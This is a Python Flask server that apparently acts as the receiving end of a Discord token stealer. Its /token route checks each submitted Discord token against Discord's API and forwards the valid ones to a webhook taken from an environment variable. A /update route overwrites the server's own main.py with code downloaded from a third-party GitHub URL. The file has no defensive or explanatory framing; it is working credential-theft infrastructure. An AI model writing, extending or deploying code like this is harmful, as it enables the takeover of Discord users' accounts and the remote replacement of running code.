from dhooks import Webhook
import os
from flask import Flask, redirect
import requests


def check_discord_token(token):
    url = "https://discord.com/api/v10/users/@me"
    headers = {
        "Authorization": f"{token}"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        return "True"
    else:
        return "False"

e = os.getenv('DISCORD_URL')
app = Flask(__name__)
hook = Webhook(e)
@app.route('/token/<string:token>')
def index(token):
  if check_discord_token(token) == "True":
      hook.send(token)

@app.route('/update')
def update():
    url = "https://raw.githubusercontent.com/43a1723/test2/main/main.py"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Kiểm tra xem yêu cầu có thành công không
        with open('main.py', 'w') as f:
            f.write(response.text)
        return 'File main.py has been updated successfully.', 200
    except requests.exceptions.RequestException as e:
        return f'Failed to download the update: {e}', 500

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
